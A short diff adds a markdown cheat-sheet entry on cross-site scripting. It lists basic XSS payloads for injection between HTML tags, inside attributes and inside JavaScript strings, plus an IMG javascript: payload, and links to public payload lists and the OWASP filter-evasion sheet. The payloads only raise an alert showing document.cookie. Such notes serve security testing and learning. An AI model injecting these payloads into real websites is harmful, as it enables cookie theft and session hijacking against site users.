@@ -1,0 +1,12 @@
+#### XSS
+Cros site scripting
+
+• Between html tags: <script>alert(document.cookie)</script>
+• Within HTML tags: "><script>alert(document.cookie)</script>
+• Inside JavaScript: ';alert(document.cookie)//
+
+<IMG SRC="javascript:alert('XSS');">
+https://github.com/payload-box/xss-payload-list/blob/main/Payloads/all-in-one.txt
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+https://github.com/terjanq/Tiny-XSS-Payloads
+
